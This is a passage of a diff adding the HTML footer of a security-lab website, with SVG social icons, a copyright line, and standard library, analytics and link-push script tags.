17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
